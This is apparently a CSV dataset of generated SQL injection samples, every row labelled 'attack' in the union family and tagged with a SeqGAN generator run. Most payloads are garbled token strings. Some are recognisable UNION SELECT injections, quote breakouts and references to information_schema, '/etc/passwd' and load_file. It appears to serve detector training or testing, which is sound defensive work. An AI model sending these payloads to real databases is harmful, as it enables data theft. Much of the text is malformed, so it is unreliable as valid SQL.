label,payload,family,payload_type,method,run_id,sample_index
attack," \from in   =  1s v$bal wherebj$n 5076dwhere  where 9571 all8nnmsiog uaseel where     =   union 9571 nullo-- d  9321 ? union 9571 allid   bocO,2489,9565-- 18583114,5367,9321",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,213
attack,"-18761234ksfvr7039 =  )   s t$,4612,4884--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,214
attack,"-8982 union all 9571 ,2990,--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,215
attack,"-'||  (  select '7564r from mod d  =xs   =  its3114n3w ba adbas where rs where iod4where  2oanaymn vbolnc59283114,4719,;,2528,1580,1580----",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,216
attack,"-7848%' union all select ve,2528-- bddeder  =  union us where x&--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,217
attack,"-2204'||  (  select 'jfwhere % 7336  =    '1' union all  7336 * .id  =  4719 where where,9571-- 4394a5235aa' baas masc2230,6255,2489--5235,7589--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,218
attack,"  )   fromjus   =  44652163uaseem Sbs idea where  )    )       union all select 3114,2489v,ba82dd  ac'-- id  where all 9584  =  =s   =  =s   =  3967 where 8498 where   9dd  =  =  )   union all 6229*  (   )   2ders icod5235dbd2256 where   =  -- -- 3114,8202-- 75897336,9571,1580--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,219
attack,"-1234%'2   as where where id  =  =  1234 where 9571 9584 as  union select u ,60835729 where 22617 =  '1' 9565 vd8ers   =  2256 old=  =  i  = mon dduasdn  where  =1550 i  =  =  1 or union all all selecte,2163,8007,1266,3733,6083--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,220
attack,"-9574' i where 9321  =r where ,from select id  =  1j7682e us in union bool 2163w man where idd  =    = us1'a)   )    n bd  d  =  =  9571 union 6630  6229     =  rs where ide  =  '1' 5543uodm d-- -- 3967a   1 where 2617a where 2489d  (n   where o i   in  =  8095 rs mol   ca ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,221
attack,"-7111%"" 5076 b0s vc9574 ry,dbodc6j,4100,3967,3733,,5076----",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,222
attack,"-or""' union all 29907141 union all 4100 where 7039er bool where select t  =  =  9571  .. r where 2990sid0  =  1rs",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,223
attack,"-'||  (  select 's2528  6915  =  from ias   =   union all select  4719,3733,3114,9321--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,224
attack,"-9574' union bown   union 8095 ers  )    )   a-- select select ban mn id  =  =  3733 * from select an booeaO=  union all select 2163,5367,2489,3075,3432---- --1266 ,'a'--,6083,5367--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,225
attack," 9571 m   =  2489 6229 all  = d  =  1 v =s 8d  =u(1d0 union 5076,2990---- 9321 8417e,2256-- 'a',1266",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,226
attack,"-4869'||  (  select 'ioe  =  1266 m  =  1 1 8950 v d  =    =  )   w t  8417  =  =  1 u""union all select 3967,8950,8007,6083--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,227
attack,"-7848'||  (  select '+'+  (  select '  )   from m union idnl  ers ion *8bodwzerse  = union select where 2256 -- -- v4100,5076-- --",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,228
attack,"-9098'||  (  select 'f""   a users where v$ann   f   union all select 57299565,8498bdad  8e  ='1' select 9584,6630-- 1'",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,229
attack,"-9098""   )    )    )3.8,b4n  =t 2391,1942--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,230
attack,"7682 %s 5076ldners where 8007rs where  =  1 union all select bamea""d  rn mon where r  = ='1'  ( m $n dde  =  1 $1s 6630 -- 2230dbcS33967eeas)a)    )    ann m mo2lan where 1266 where select 8417 4719oducsea26en uyal bal where where 5543s where union       4719 union all ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,231
attack,"-4465x '||  (  select 'n all $aN -- ion dran ban mod5nmers$'||  (  select 'fe  7682 l  =   =  =n   = union all * '||  (  select 'n 8147 boan   )    1ldanner union all all 6229-- 9128rs,5235-- -- -- where 3967,,5235--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,232
attack,"-7848uyyeyw ' -- wherebidc5235  8    as   c3114 where ron 2256idd9ddbidt=  =al where union where -- 2163,2528,2489,9321,5235,3733R--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,233
attack,"-7848%   )   )    O (n all all "", ""   2163 1' where union -- der-- ,1580,5235,8007,4011--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,234
attack,"-union ia union 9565 4394,2489,6196dbn3",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,235
attack,"-9 bon v  =  =  1 union all 2489bnn mol2al boaen where   =  =    union all v$,2163 where where  1234 where where select all where 6196n information_schema bodberwhere   =  =  9571 vr """"wchar rioRn select 9128  =  6020 * 9584 union where all2391-- -- 2617 -- 8202,5076,I+'",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,236
attack,"-m%'||  (  select 'prsiogb    ' idc where where v$,ba   ON <3733rs  =  87589 union 8417 1942e  =  =  -- select 8095,6083,4394--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,237
attack,"-6186""   union 6083select 8417,2256,9128--N8498--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,238
attack,"-4452or from union all select 5928 ,8202,,5235,@2489,9128---- select3967b5",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,239
attack,"-7627'||  (  select 'pua'3Ibnn m e  =  7682 where 1942 union   3967  =  7336 union where all 2256s -- 8202 baone union select 1858,9128--,2528--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,240
attack," union all all 4100 from bo  =  '1' all 1858 5076select 9565,4719,7336--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,241
attack,"-%'||  (  select 've  8202 td   6630,7039a mcan  union all select 5928 -- 1,,8147---- -- select",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,242
attack,"-6020' % where where 6346r,9565 -- \,2391,4011--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,243
attack,"iam  +  = select 3114    4612  =n m  (e,  =  union all where select bal cal  -- union v b  = dn   where -- bdwhere,3114 -- 9321-- 4394,4011,1942--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,244
attack,"-9046%'||  (  select 'qpanv =  =  1 where all select 9584,5076,8095,6346,4011,~3114--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,245
attack," -- select 7336ann m ro  =  9565 union =   '1'  1 \or union 1 union v$ge  )    )    )   boledra9v 3967al 8147,9,8147,--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,246
attack,"-2314c   a)easr where select 4884-- select ,6346,4011,2391,1580--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,247
attack,"-3017 xssea    n Nr,25282489 --",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,248
attack,"-4465'||  (  select 'xxxq' il veran union 8950 rs in where id  (  =  1   .w    union  '1'  all select bcnnm where union 8202 id  =  3114 =     select information_schema 1' 5076 whereidm5076 *s 2528 5367  =    )   2617 dln where 1266  =  =^s  ers where it where 2256  =  =  )   from union or all all V6083iders where 1942,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,249
attack," from vers where  =  =  1 select 5235,4011,4100,4011,5076--,2528--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,250
attack,"> all all select where union or union all where 2489  select cs ,boasRj  =  rs ioas bo7682 where d  s0 d  = where id  62293733uas mon mon all *  =  =m  =  u^ us cu' +l  =  )   )    )    where id  =  )   union select 1,2489,all,8202--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,251
attack,"-1876m.ofggu2617sean u' id0 where Vwhere id  =  =+from i  =  )    )   union all all 1union 3114 select ,8147,5076-- union where",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,252
attack,"-3226%"")   %' v,12669321re)    dbd03giasasecdan v  8095  union  =  =  ( """"   d  =  1 union all all select   3114 g  7589 -- bdhf  N bonaas mmc8095 where dcs where where select   =  1 where =  1266 union 6915 v,2163,,8095,bunion 6083,9571-- -- ,9128--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,253
attack,-2384'||  (  select 'ka8l'zc,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,254
attack,"i  v$8147n where iounion 5076,8498-- 3075-- 1",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,255
attack,"-4876%""n * union 6083on im  =  '1'  (   c from  )   union all 5076 608312664884 8007' where 15808RSt-- 5928,2489--no00553=5--  '/etc/passwd'd)    d 57299571sddaa",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,256
attack," union 3967 t  =   =  ( union all all  un where  4394id where select where cin id  =  )    )   )    ON baMnn usea' all xs 8007e  =  =  (   3075 union  u  = +  -  us' where d  9584=  1$9321s id  =  =  =  ' union all select 6630 where 8007-- mdbale where ban union 1580,8147#,5235,52359565-- ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,257
attack,"-6020' union select -- 5235,9565,9128--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,258
attack,"-2314%""' union ron u  =  union all select '||  (  select 'd  =from il where 8950xs 4719  8095 ,boa-- 7589 -- where *  9321   (  =  50764884 d  =  ,3114 +  39677589   =s all =  =  1942 1"" b8  =  8095 from   =  )   union  all union * *-- null,8147,8095-- ,4011,4100,4884,8202,8007,4011",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,259
attack," * wherers where union select 3303r5,null,5543,9584,R?-- --",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,260
attack,"-1641   8325    )   union --  3114baaidwnmd  =  =  ( select 4100,5235,5235,,5235--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,261
attack," %oan uoders where idte id  =  7682=  =r from where t union b  =  =  -- u-- 8095,ban    an bke from where 7141  =  (  =  1 union where 6630  8095   =  2617 where 7779-- i  =  =  9321 union all 7779 84174394,2391,4884,8950,8007--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,262
attack,"n 9584 union where 4612,d,6346,6346--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,263
attack,"-1606""'+  (  select '   )    union m8950s  =  -s(  7848)    )   9584 i  5 d      rs m  =  =  =  )    }   union union  select rown uo,cann   )   c all 6915idc 8202rw   m  =   =  =  1  union all select all null-- rs ', ' 4719saeunion all 1^ where union in * whereidall4100  =o=  a union mosioaseran r",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,264
attack,"-7485%"" union 9565 5729  =  =  '1' where select 8,ban 5928fersidm  = m  =  2528 select from m  6229on  =  =  =  3967 all select 84988202,3432,4100,9571,61967589---- --",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,265
attack,"-9808' from union all   = select 4394,2528r,8095, 4100,5235--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,266
attack,"-'  union where 5367q union N 5235,2990RS3114,8095--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,267
attack,"-3226'||  (  select 'y""!""cc2305 1'p",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,268
attack,"-52172899 c 9565,2528,40113967",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,269
attack,"-2384'||  (  select 's'||  (  select 'Ix+5817)   j9571 where where 3733  idm  =  =$-- -- 6083rs,9565",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,270
attack,"%  '1'  from f   select 8095,bdean m  null  =  )    )   )   union ver<  )   )   union all null,5076aanzr,8202,@@Vjo,5367,2256,3114--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,271
attack," -; c  '||  (  select '  8202 where id  =  1  '1' or all select5543,8007 8095--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,272
attack," all select 2163  (    )    8147 where *,id8d4as m  =  1,1942,8007--3075--,8202--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,273
attack,"-6067   x 1p-- select ,    -- --'",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,274
attack,"-7564'm all usedv  =m moleann un  )    )n  select2n u55ann selecterownml where id all 7589.18007,  where \9565 ow    where  =  1 union all select 6083  =  =  16412163  2163 union from d  =  =  - m   =  = um union select .-- where baynbd  8,0,5367--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,275
attack,"-1876""union v7336rw all select 1858,8950,39675235,blidvedcodbalnq--n rs whereiodeunion char 4100 where where 6229  =  5776-- union all bon  =  select 2256 by where -- bsey'    =  1 union % 21638095  =  7682   =  (  =  '1'  select 8950,5235,8950,3432--7779#,81473114s",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,276
attack,y' select 5928 m  =union mowode  =select 8950a,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,277
attack,"-7564'+  (  select '' select   =  -'||  (  select '"", ""an use'a')   n us#  = 2489 all xnn  )   union 8095 bs bn 4719a   an m  =   union select 75893967 ,3114;es,Iaan where bd  =  3967 2617s where9584--  rse where 9571  =  7682 where i  (o)    )     from i  i  =  =  =  )   ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,278
attack, vers m,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,279
attack,1234 9128oaan m  =     byln in uas d3967baaeannv    81c5 where alloldoaal where'  union select  -- where <where where information_schemabodnmnulbaa? v select   ( d  =  '1'   9321 ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,280
attack,-3924q' select where 7336  =  =  8498 * from mow   --,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,281
attack,"-%' xunion all 9565 where E23917589,1580d8147,8202,9321",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,282
attack,"-300939244058  7039      )    a' urs where or d  )'+  (  select '=   s 7039  s  =  = union   =  r select union 5543*  =  +  4100u us k b  7001e  =  )   union all all v  =  4058 union all 8147 where 9571 where i  =  9571 8202 o  =  3560<select union id   =  (4719 ' AND 1  =  0 UNION ALL SELECT 'odr  =  =  1266   =  =  ( all us d ,5e,6083-- where * ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,283
attack,"-p'||  (  select '  -6915's muyap  (    union  all idde  =s d  2489 mn where 6083  5076 where   id  =  =  =   union select 3967aea -- der union all iders where where uas o-- 8007y,IOfrom boa-- 1858an bnerasal ers idbd  55 union 5543w  =  1 union all 8095 all,37333114,--,2617-- 4884",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,284
attack,"-9574' union v,7682a9584n 80958095ege   id  =  * union where union all 9128  =  i  8095   or where 2528 where %id  =  (   union all all bdbd  6229Sd2ea' =  )   )    ,d-- -- ddners b2derl where where select 9571 udd81n where 8007$r5union all bode  =  ( us d9128  =  1  e  1 from where,2528,7589",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,285
attack,"3009'+  (  select '9321rs 7336   I where =  =   union select vers 8095 od0er where t idrin union 2256 v185884983114,,ve=  =   union select select 9584,6630,3432r,2489--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,286
attack," on uan    )nn usm  =  4719  =  (  or all 50761,4884,2489,5076 ,8950--ea7682",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,287
attack," union select idbann  awnu8pm  =  7589 2617  =s  )e  7682 oase="" union all all where u,6196,2528,8950--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,288
attack,"-5776% +   )   )   8417 *s  =  =  ( union select 4719,9128,6083--2391,1942,1580,4011,4011,2391,6630",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,289
attack," -I   3638 bonn all mydc8095ers where booleas dm  inu  =  5367 union 2256 information_schema|7001  =  8095+  =  1 all union   1 union all all n union union 9777 all i  =  8417 id4100  =  =  ,6196,2489=  =  '1' select  1,2528,d,7141,9571,8202,7141,bReRan m cas where 9321 ron all idn =  =  ) |  )   ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,290
attack,-4876' row m bonn where union 6915 rs  =   xw all b5  6)   d where where oan uchar --an all oders usp  =  select 1266.-- i0an union where idersaan md  =    from all m  =  -- all * 2617sunion 8417 3303where boan  b-$ve(    w  ers$8202 where id  d  =  =   all select ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,291
attack,"-3638"" * union   or all all all 1 2163 4884RS8095,6083-- er -- where ind8417  18677s d  = d  union  id'+  (  select '  =   where 5076 6630  1266 selectidz  =  = all whereR  rsi  =adua union I -- 8202 min where all where 2256 bownme  union all * from v  m  = all 9777 where where us an where d  =  =  2489   ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,292
attack," where null8007,-- 4884,9571,5076,5235--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,293
attack,"-4058   r2528 55438147  =  union select d6229er,4394-- 2256,9321932120483O6as wherer",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,294
attack,"-7637""2643 us ea where where  dd  =  =  ( uown usw-e1 union 9584 -- r idd  =  from all -- 3560.ban  bjduan)    )     ba  where 7141d-- where from where union 6083 union all 8417  d j  m  =s union where @  =  =  ( m  =-p mod  =   + or u  =  '1' ""  union moes *  2256i  =  =",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,295
attack,"-4711cu' all select ban dcbal  1,4,5235--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,296
attack,-9145'||  (  select 'cas',union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,297
attack,"-7111%' ia union union 1266 where where where idua from 6229  (  =  1,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,298
attack,"1234 3733 where select bodeal where 8202  =  =  -- 1858,2528-- 6630,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,299
attack,"-4058' 4884 id  =  6255 from all m3733where union @R  =  9565 select  -- 2528 all """"al 22567039 where vV'1942 union select 5076,8147,3114--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,300
attack,"--6)   union  null jidlers ide  =  2990from man where select id  =  )       8 de  =m  8095 where ioa  =  1 vers   =  =  +  in uan u where information_schemalboan n b5c9777 aas d,3bala * where in *from -- b bas 'cban8gne  =  ( select 9321,6196-- aa' d,-	load_file",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,301
attack,"-6067union --as""a as where where  =  1 union all select 8147,8095,8007-- ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,302
attack,"-4876""   )    d# ya bhj5928  where all 4612roders odselecte  )   from   =  id  =  4100 union select1,5928,8095--1,6229,5235,5235--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,303
attack,-'+  (  select ''||  (  select '    3442n    l5c1ed   as205ldcbgededbSIO,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,304
attack,"-9046s' union all all select select 7779,3733",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,305
attack,-5217' am  =   union all     boea tod8950belidiaan mbolean us blneaselr2528,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,306
attack,"-2899u'||  (  select 'aleane  aon all select bn 7039d04100er all union 4884    =    1 +++   us u's id)   vers alle x  =  * +se  =  1 1 %   )    )   )RSall all 3967  where all -- 2163er where idmve  =  1 b  5817       union useas kn ban uase  =  k union u3370,6196,3114,4394,4394--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,307
attack,"% union select 9128n 4394e  =rs where 62551266n mo  = 4719 where   bwu%  8095  =  2617 ( 1 where 4884   =  =  * union all 7039 where select d  =  od   =  =  from where 1 where $-- t id0erisw    --n cs where 5076an 8498   union select 3733,4100,--2163, -- 8007,48847039,8007---- --",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,308
attack,"-3593"")    s' 3114 from#5 where where i  =  union all union users 3114oddlang5ann   =   select select 9571,2489,2528,;,9321,5235,null,4011--,2163,8007,2528--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,309
attack,"  )   union select select 21633114,3114--4719,9321,8147--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,310
attack,"-a union us  =  = select 95718498<'1' v 5543id  7001  where   =  4394 where union all 9565 8202 1s mswhere id  =  1s us us   =  =  3967 |as =  1 rs id  rool icaas e  =    1 all select 6229,2256,4719--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,311
attack,"-'+  (  select ')"", ""n   )    as an cas where from where rs i  =  1 union 6229where 6630uas )   bad    )    es -2230 bc  6083-- aunion -- -- 3733,3967,--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,312
attack,"""rs i  = onn id xal where all where 8950didw boole,8950,,bw,3114,8007,1942----",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,313
attack,"-%""  )    a uown monn u  =  6630)n m  3432 ban users idm  1266   =  =  1 -- union ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,314
attack,"-1876ux' select idd   bbann mleasers 9145in all where 9584 ,6083where where from  =  select -- 1,7682,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,315
attack,"-4465'||  (  select '  v v  =  union from select8417 4394d2163e'/etc/passwd'  =  )   union where bn   )   )    as an m where where id  =  )   ON 2163 ban bod46122163bm    =s 3967dbmt  8007,4011,2528--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,316
attack,"-'||  (  select 'i   union -- where *,5729,9571,4011,4011,5235--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,317
attack,"$+  )   union all 3432  = select 9321,8095er",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,318
attack,"-3638""union select 3733,4719,7141--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,319
attack,"-9145usxg'n muwn%eer,2163--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,320
attack,"-%""s' union select 4719,5076,7779,3432,4394,,7141,4011--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,321
